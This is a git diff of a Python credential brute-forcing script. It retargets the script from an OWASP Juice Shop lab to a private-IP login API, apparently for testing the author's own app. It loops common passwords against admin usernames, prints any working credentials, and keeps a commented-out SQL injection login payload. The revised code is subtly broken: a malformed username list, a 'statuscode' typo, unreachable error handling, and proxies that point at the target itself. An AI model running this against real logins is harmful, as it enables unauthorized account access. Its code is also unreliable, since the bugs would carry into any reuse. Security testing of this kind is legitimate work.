@@ -1,17 +1,16 @@
 import requests
 import time
 
-# Using OSWAP Juice for brute force testing
-# Once front and back end are created values will change
-TARGET_URL = "http://127.0.0.1:3000/rest/user/login"    # The target port to be sent to burpsuite
+TARGET_URL = "http://172.20.10.12:8000/api/login"    # Backend API endpoint
 SUCCESS_INDICATOR = "Success"
 
 # usernames = ["admin' or '1'='1'--"] # Juice swap SQL injection
-usernames = ["admin@juice-sh.op"]
-passwords = ["password", "123456", "admin", "pwnd", "letmein"]
+usernames = ["admin, Admin"]
+passwords = ["password123", "123456", "admin", "pwnd", "letmein"]
 
 proxies = {
-    "http": "http://127.0.0.1:8081"
+    "http": "http://172.20.10.12:8000/",   # Burp proxy (comment out if not needed)
+    "https": "https://172.20.10.12:8000/"   
 }
 
 headers = {
@@ -19,30 +18,35 @@ headers = {
 }
 
 session = requests.Session()
-session.proxies = proxies
+session.proxies.update(proxies)
 
-# for i in range(10):    Complete when sending 100 attacks
-for username in usernames:
-    for password in passwords:
-        payload = {
-            "email": username,
-            "password": password
-        }
-        print(f"Sending to Burp...\nUsername: {username}\nPassword: {password}")
+for i in range(10):   # Complete when sending 100 attacks
+    for username in usernames:
+        for password in passwords:
+            payload = {
+                "username": username,   # Fixed: field name is "username", not "email"
+                "password": password
+            }
+            print(f"Sending to Burp...\nUsername: {username}\nPassword: {password}")
 
-        response = session.post(
-            TARGET_URL,
-            json=payload,
-            headers=headers
-        )
+            response = session.post(
+                TARGET_URL,
+                json=payload,
+                headers=headers
+            )
 
-        if (response.status_code == 200):
-            print("SUCCESS!\n")
-            print(f"Credentials:\nUsername: {username}\nPassword: {password}")
-            print("Status:", response.status_code)
-            break
-        else:
-            print("Status:", response.status_code)
-            print("Failed!\n")
+            if response.status_code == 200:
+                data = response.json()
+                if data.get("success"):   # Check for actual login success
+                    print("SUCCESS!\n")
+                    print(f"Credentials:\nUsername: {username}\nPassword: {password}")
+                    print("Status:", response.status_code)
+                    break
+                elif response.statuscode == 404:
+                    print("Status:", response.status_code)
+                    print("Failed! Not found!\n")
+            else:
+                print("Status:", response.status_code)
+                print("Failed!\n")
 
-        time.sleep(0.4)
+            time.sleep(0.4)
